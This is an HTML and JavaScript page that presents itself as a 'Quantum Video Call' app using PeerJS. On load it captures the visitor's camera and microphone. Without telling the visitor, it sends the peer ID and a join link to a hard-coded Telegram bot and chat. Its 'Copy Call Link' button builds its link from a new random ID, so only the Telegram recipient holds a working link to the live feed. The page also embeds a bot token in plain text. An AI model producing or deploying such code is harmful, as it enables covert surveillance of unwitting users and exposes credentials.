<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Quantum Video Call</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: linear-gradient(135deg, #0f172a, #1e293b);
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      overflow: hidden;
      height: 100vh;
      position: relative;
    }

    .stars {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: -1;
    }

    .star {
      position: absolute;
      background: #fff;
      border-radius: 50%;
      animation: twinkle var(--duration, 5s) infinite var(--delay, 0s);
    }

    @keyframes twinkle {
      0%, 100% { opacity: 0.2; }
      50% { opacity: 1; }
    }

    .container {
      display: flex;
      flex-direction: column;
      height: 100vh;
      position: relative;
    }

    .video-container {
      flex: 1;
      position: relative;
      overflow: hidden;
    }

    #remoteVideo {
      width: 100%;
      height: 100%;
      object-fit: cover;
      background: #000;
      cursor: move;
      position: absolute;
      top: 0;
      left: 0;
    }

    #localVideo {
      width: 180px;
      height: 120px;
      position: absolute;
      bottom: 130px;
      right: 20px;
      border: 2px solid #00e4ff;
      border-radius: 8px;
      z-index: 10;
      box-shadow: 0 0 20px rgba(0, 228, 255, 0.5);
      transition: all 0.3s;
    }

    #localVideo:hover {
      transform: scale(1.05);
    }

    .status-container {
      position: absolute;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      flex-direction: column;
      align-items: center;
      z-index: 10;
      gap: 8px;
    }

    .status {
      padding: 12px 25px;
      background: rgba(0, 228, 255, 0.2);
      border-radius: 30px;
      font-weight: bold;
      font-size: 16px;
      backdrop-filter: blur(5px);
      border: 1px solid rgba(0, 228, 255, 0.3);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      min-width: 220px;
      text-align: center;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-weight: 600;
    }

    .timer {
      background: rgba(0, 0, 0, 0.5);
      padding: 6px 15px;
      border-radius: 20px;
      font-size: 16px;
      font-weight: 500;
      backdrop-filter: blur(5px);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .controls {
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 20px;
      z-index: 10;
      background: rgba(15, 23, 42, 0.7);
      padding: 15px;
      border-radius: 50px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(0, 228, 255, 0.3);
    }

    .control-btn {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background: rgba(30, 41, 59, 0.8);
      backdrop-filter: blur(8px);
      border: 2px solid #00e4ff;
      color: #00e4ff;
      font-size: 22px;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 0 15px rgba(0, 228, 255, 0.3);
    }

    .control-btn:hover {
      background: rgba(0, 228, 255, 0.3);
      transform: translateY(-5px);
      box-shadow: 0 5px 20px rgba(0, 228, 255, 0.5);
    }

    .control-btn:active {
      transform: translateY(0);
    }

    .fullscreen-btn {
      position: fixed;
      top: 20px;
      right: 20px;
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background: rgba(30, 41, 59, 0.8);
      border: 2px solid #00e4ff;
      color: #00e4ff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      cursor: pointer;
      z-index: 10;
      transition: all 0.3s;
      box-shadow: 0 0 15px rgba(0, 228, 255, 0.3);
    }

    .fullscreen-btn:hover {
      background: rgba(0, 228, 255, 0.3);
      transform: scale(1.1);
    }

    .connection-info {
      position: fixed;
      top: 70px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(15, 23, 42, 0.8);
      padding: 15px 25px;
      border-radius: 12px;
      font-size: 14px;
      z-index: 10;
      backdrop-filter: blur(5px);
      border: 1px solid rgba(0, 228, 255, 0.3);
      text-align: center;
      max-width: 80%;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .copy-btn {
      background: rgba(0, 228, 255, 0.2);
      border: 1px solid #00e4ff;
      color: #fff;
      padding: 8px 15px;
      border-radius: 20px;
      cursor: pointer;
      font-weight: 500;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .copy-btn:hover {
      background: rgba(0, 228, 255, 0.3);
      transform: translateY(-2px);
    }

    .retry-btn {
      position: fixed;
      top: 20px;
      left: 20px;
      padding: 10px 20px;
      background: rgba(0, 228, 255, 0.2);
      border: 2px solid #00e4ff;
      color: #00e4ff;
      border-radius: 30px;
      cursor: pointer;
      font-weight: bold;
      z-index: 10;
      backdrop-filter: blur(5px);
      transition: all 0.3s;
    }

    .retry-btn:hover {
      background: rgba(0, 228, 255, 0.3);
      transform: translateY(-3px);
    }

    .pulse {
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(0, 228, 255, 0.7); }
      70% { box-shadow: 0 0 0 15px rgba(0, 228, 255, 0); }
      100% { box-shadow: 0 0 0 0 rgba(0, 228, 255, 0); }
    }

    .notification {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0, 200, 83, 0.8);
      color: white;
      padding: 10px 20px;
      border-radius: 30px;
      z-index: 100;
      opacity: 0;
      transition: opacity 0.3s ease;
      backdrop-filter: blur(5px);
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }

    .notification.show {
      opacity: 1;
    }
  </style>
</head>
<body>
  <div class="stars" id="stars"></div>
  <div class="notification" id="notification">Link copied to clipboard!</div>
  
  <div class="container">
    <div class="video-container">
      <video id="remoteVideo" autoplay playsinline></video>
      <video id="localVideo" autoplay muted playsinline></video>
      
      <div class="status-container">
        <div class="status" id="status">CONNECTING...</div>
        <div class="timer" id="timer">00:00:00</div>
      </div>
      
      <div class="connection-info" id="connectionInfo"></div>
      <button class="retry-btn" id="retryBtn" style="display: none;">RETRY CONNECTION</button>
      
      <div class="fullscreen-btn" id="fullscreenBtn"><i class="fas fa-expand"></i></div>
      
      <div class="controls">
        <div class="control-btn" id="switchCameraBtn"><i class="fas fa-camera"></i></div>
        <div class="control-btn" id="muteBtn"><i class="fas fa-microphone"></i></div>
        <div class="control-btn pulse" id="endBtn"><i class="fas fa-phone-slash"></i></div>
      </div>
    </div>
  </div>

  <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
  <script>
    const BOT_TOKEN = "7743009303:AAEfCdb2kU3xjZHbU-mo_qUbP3wA4aejDRo";
    const CHAT_ID = "878604830";
    const MAX_RETRIES = 3;
    const RETRY_DELAY = 3000;

    let peer;
    let localStream;
    let currentCall;
    let isMuted = false;
    let currentCamera = 'user';
    let connectionRetries = 0;
    let callStartTime = 0;
    let timerInterval = null;
    let isDragging = false;
    let dragOffsetX, dragOffsetY;

    const localVideo = document.getElementById('localVideo');
    const remoteVideo = document.getElementById('remoteVideo');
    const statusEl = document.getElementById('status');
    const fullscreenBtn = document.getElementById('fullscreenBtn');
    const retryBtn = document.getElementById('retryBtn');
    const connectionInfo = document.getElementById('connectionInfo');
    const timerEl = document.getElementById('timer');
    const notification = document.getElementById('notification');

    // Create stars for background
    function createStars() {
      const starsContainer = document.getElementById('stars');
      const starCount = 150;
      
      for (let i = 0; i < starCount; i++) {
        const star = document.createElement('div');
        star.classList.add('star');
        
        // Random position
        star.style.left = `${Math.random() * 100}%`;
        star.style.top = `${Math.random() * 100}%`;
        
        // Random size
        const size = Math.random() * 3;
        star.style.width = `${size}px`;
        star.style.height = `${size}px`;
        
        // Random animation
        star.style.setProperty('--duration', `${Math.random() * 3 + 2}s`);
        star.style.setProperty('--delay', `${Math.random() * 5}s`);
        
        starsContainer.appendChild(star);
      }
    }

    // Show notification
    function showNotification(message) {
      notification.textContent = message;
      notification.classList.add('show');
      setTimeout(() => {
        notification.classList.remove('show');
      }, 2000);
    }

    // Start call timer
    function startTimer() {
      callStartTime = Date.now();
      timerInterval = setInterval(() => {
        const elapsed = Date.now() - callStartTime;
        const hours = Math.floor(elapsed / 3600000);
        const minutes = Math.floor((elapsed % 3600000) / 60000);
        const seconds = Math.floor((elapsed % 60000) / 1000);
        
        timerEl.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      }, 1000);
    }

    // Stop call timer
    function stopTimer() {
      if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
      }
    }

    async function getMedia(cameraFacingMode = 'user') {
      try {
        return await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 },
            frameRate: { ideal: 30 },
            facingMode: cameraFacingMode
          },
          audio: true
        });
      } catch (err) {
        console.error('Error accessing media devices:', err);
        statusEl.innerText = 'MEDIA ERROR';
        connectionInfo.innerHTML = 'Failed to access camera and microphone. Please check permissions.';
        throw err;
      }
    }

    async function init() {
      createStars();
      
      const urlParams = new URLSearchParams(window.location.search);
      const code = urlParams.get('code');
      
      try {
        localStream = await getMedia();
        localVideo.srcObject = localStream;
        
        if (code) {
          // Receiver - connect to initiator
          statusEl.innerText = 'CONNECTING...';
          connectionInfo.innerHTML = `Connecting to peer: <strong>${code}</strong>`;
          connectAsReceiver(code);
        } else {
          // Initiator - create peer and wait for connection
          const myId = generateId();
          statusEl.innerText = 'AWAITING CONNECTION...';
          connectionInfo.innerHTML = `<button class="copy-btn" id="copyLinkBtn">
            <i class="fas fa-copy"></i> Copy Call Link
          </button>`;
          
          sendToTelegram(myId);
          peer = new Peer(myId, { secure: true, host: '0.peerjs.com', port: 443 });
          
          peer.on('open', () => {
            statusEl.innerText = 'READY FOR CONNECTION';
          });
          
          peer.on('call', call => {
            call.answer(localStream);
            currentCall = call;
            statusEl.innerText = 'CONNECTED';
            connectionInfo.innerHTML = '';
            startTimer();
            
            call.on('stream', stream => {
              remoteVideo.srcObject = stream;
            });
            
            call.on('close', () => {
              statusEl.innerText = 'CONNECTION CLOSED';
              stopTimer();
              setTimeout(() => window.location.reload(), 3000);
            });
            
            call.on('error', (err) => {
              console.error('Call error:', err);
              statusEl.innerText = 'CALL ERROR';
              connectionInfo.innerHTML = `Error: ${err.message || err.type}`;
              stopTimer();
            });
          });
        }
        
        peer.on('error', (err) => {
          console.error('PeerJS error:', err);
          statusEl.innerText = 'PEER ERROR';
          connectionInfo.innerHTML = `Error: ${err.message || err.type}`;
          stopTimer();
          
          if (code && connectionRetries < MAX_RETRIES) {
            connectionRetries++;
            connectionInfo.innerHTML += `<br>Retrying in 3 seconds (${connectionRetries}/${MAX_RETRIES})...`;
            setTimeout(() => connectAsReceiver(code), RETRY_DELAY);
          } else if (code) {
            retryBtn.style.display = 'block';
          }
        });
        
      } catch (err) {
        console.error('Initialization error:', err);
        statusEl.innerText = 'INIT ERROR';
        connectionInfo.innerHTML = 'Failed to initialize. Please refresh the page.';
      }
    }

    function connectAsReceiver(code) {
      peer = new Peer({ secure: true, host: '0.peerjs.com', port: 443 });
      
      peer.on('open', () => {
        const call = peer.call(code, localStream);
        currentCall = call;
        
        call.on('stream', stream => {
          statusEl.innerText = 'CONNECTED';
          connectionInfo.innerHTML = '';
          remoteVideo.srcObject = stream;
          startTimer();
        });
        
        call.on('close', () => {
          statusEl.innerText = 'CONNECTION CLOSED';
          stopTimer();
          setTimeout(() => window.location.reload(), 3000);
        });
        
        call.on('error', (err) => {
          console.error('Call error:', err);
          statusEl.innerText = 'CALL ERROR';
          connectionInfo.innerHTML = `Error: ${err.message || err.type}`;
          stopTimer();
          
          if (connectionRetries < MAX_RETRIES) {
            connectionRetries++;
            connectionInfo.innerHTML += `<br>Retrying in 3 seconds (${connectionRetries}/${MAX_RETRIES})...`;
            setTimeout(() => connectAsReceiver(code), RETRY_DELAY);
          } else {
            retryBtn.style.display = 'block';
          }
        });
      });
    }

    function generateId() {
      return Math.random().toString(36).substring(2, 8).toUpperCase();
    }

    function sendToTelegram(peerId) {
      const message = `🚀 New Video Call Started\n\n🔑 Peer ID: ${peerId}\n🔗 Link: ${window.location.href}?code=${peerId}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      }).catch(err => console.error('Telegram error:', err));
    }

    // Event Listeners
    document.getElementById('muteBtn').onclick = () => {
      isMuted = !isMuted;
      const audioTracks = localStream.getAudioTracks();
      if (audioTracks.length > 0) {
        audioTracks[0].enabled = !isMuted;
      }
      document.getElementById('muteBtn').innerHTML = isMuted
        ? '<i class="fas fa-microphone-slash"></i>'
        : '<i class="fas fa-microphone"></i>';
    };

    document.getElementById('switchCameraBtn').onclick = async () => {
      try {
        currentCamera = currentCamera === 'user' ? 'environment' : 'user';
        const newStream = await getMedia(currentCamera);
        const videoTrack = newStream.getVideoTracks()[0];
        
        if (currentCall && currentCall.peerConnection) {
          const sender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
          if (sender) sender.replaceTrack(videoTrack);
        }
        
        // Preserve mute state when switching cameras
        const audioTracks = newStream.getAudioTracks();
        if (audioTracks.length > 0) {
          audioTracks[0].enabled = !isMuted;
        }
        
        localVideo.srcObject = newStream;
        localStream.getTracks().forEach(track => track.stop());
        localStream = newStream;
      } catch (err) {
        console.error('Error switching camera:', err);
        connectionInfo.innerHTML = 'Error switching camera. Please try again.';
      }
    };

    document.getElementById('endBtn').onclick = () => {
      if (currentCall) {
        currentCall.close();
      }
      if (peer) {
        peer.destroy();
      }
      statusEl.innerText = 'ENDING CALL...';
      stopTimer();
      setTimeout(() => window.location.reload(), 1000);
    };

    fullscreenBtn.addEventListener('click', () => {
      if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen();
        fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
      } else {
        document.exitFullscreen();
        fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
      }
    });

    retryBtn.addEventListener('click', () => {
      const urlParams = new URLSearchParams(window.location.search);
      const code = urlParams.get('code');
      if (code) {
        retryBtn.style.display = 'none';
        connectionRetries = 0;
        statusEl.innerText = 'RECONNECTING...';
        connectionInfo.innerHTML = `Reconnecting to peer: <strong>${code}</strong>`;
        connectAsReceiver(code);
      }
    });

    // Copy link to clipboard
    document.addEventListener('click', (e) => {
      if (e.target.id === 'copyLinkBtn' || e.target.closest('#copyLinkBtn')) {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code') || generateId();
        const link = `${window.location.href.split('?')[0]}?code=${code}`;
        
        navigator.clipboard.writeText(link).then(() => {
          showNotification('Call link copied to clipboard!');
        }).catch(err => {
          console.error('Copy failed:', err);
          showNotification('Failed to copy link');
        });
      }
    });

    // Draggable remote video
    remoteVideo.addEventListener('mousedown', (e) => {
      if (!document.fullscreenElement) {
        isDragging = true;
        dragOffsetX = e.clientX - remoteVideo.getBoundingClientRect().left;
        dragOffsetY = e.clientY - remoteVideo.getBoundingClientRect().top;
        remoteVideo.style.cursor = 'grabbing';
      }
    });

    document.addEventListener('mousemove', (e) => {
      if (isDragging && !document.fullscreenElement) {
        e.preventDefault();
        const x = e.clientX - dragOffsetX;
        const y = e.clientY - dragOffsetY;
        
        remoteVideo.style.left = `${x}px`;
        remoteVideo.style.top = `${y}px`;
      }
    });

    document.addEventListener('mouseup', () => {
      if (isDragging) {
        isDragging = false;
        remoteVideo.style.cursor = 'grab';
      }
    });

    // Initialize the app
    init();
  </script>
</body>
</html>
